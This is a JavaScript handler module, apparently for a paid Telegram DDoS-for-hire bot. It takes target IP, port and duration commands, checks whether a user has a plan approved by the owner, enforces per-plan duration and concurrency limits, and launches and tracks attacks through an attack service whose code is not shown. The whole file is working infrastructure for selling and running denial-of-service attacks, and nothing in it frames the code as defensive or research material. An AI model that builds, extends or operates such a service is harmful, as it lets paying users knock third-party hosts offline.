const userService = require('../services/userService');
const attackService = require('../services/attackService');
const { formatMethodsList } = require('../utils/commands');
const { backToMenuKeyboard } = require('../utils/keyboards');

class AttackHandler {
  sendCommandsHelp(bot, chatId, telegramId) {
    const plan = userService.getActivePlan(telegramId);

    if (!plan) {
      bot.sendMessage(chatId, 'No plan. Buy one and wait for owner approval.', {
        reply_markup: backToMenuKeyboard()
      });
      return;
    }

    const limits = plan.isOwner
      ? 'Limits: unlimited'
      : `Max ${plan.maxDuration}s | ${plan.concurrent}c | active ${attackService.getActiveCount(telegramId)}`;

    bot.sendMessage(chatId, `${formatMethodsList()}\n\n${limits}`, { reply_markup: backToMenuKeyboard() });
  }

  async handleAttackCommand(bot, msg, match, method) {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;

    userService.registerUser(msg.from);

    const plan = userService.getActivePlan(telegramId);

    if (!plan) {
      bot.sendMessage(chatId, 'No active plan.', { reply_markup: backToMenuKeyboard() });
      return;
    }

    const target = match[1]?.trim();
    const port = Number(match[2]);
    const duration = Number(match[3]);

    if (!target) {
      bot.sendMessage(chatId, `Usage: /${method.command} ip port duration`);
      return;
    }

    if (!Number.isInteger(port) || port < 1 || port > 65535) {
      bot.sendMessage(chatId, 'Bad port.');
      return;
    }

    if (!Number.isInteger(duration) || duration < 1) {
      bot.sendMessage(chatId, 'Bad duration.');
      return;
    }

    if (!plan.isOwner && duration > plan.maxDuration) {
      bot.sendMessage(chatId, `Max duration is ${plan.maxDuration}s on your plan.`);
      return;
    }

    if (!attackService.canLaunch(telegramId, plan.concurrent)) {
      bot.sendMessage(chatId, `Concurrent limit reached (${plan.concurrent}).`);
      return;
    }

    const statusMsg = await bot.sendMessage(
      chatId,
      `Starting ${method.name}\n${target}:${port} for ${duration}s`
    );

    const result = attackService.launchAttack({
      telegramId,
      username: msg.from.username,
      target,
      port,
      method: method.name,
      duration,
      maxConcurrent: plan.concurrent
    });

    if (result.error === 'concurrent_limit') {
      bot.editMessageText(`All ${result.max} slots in use.`, {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
      return;
    }

    bot.editMessageText(
      `Running ${method.name}\n${target}:${port} | ${duration}s\nSlots: ${attackService.getActiveCount(telegramId)}/${plan.isOwner ? 'inf' : plan.concurrent}`,
      { chat_id: chatId, message_id: statusMsg.message_id, reply_markup: backToMenuKeyboard() }
    );

    setTimeout(() => {
      bot.sendMessage(chatId, `Done ${method.name} on ${target}:${port}`).catch(() => {});
    }, duration * 1000);
  }
}

module.exports = new AttackHandler();
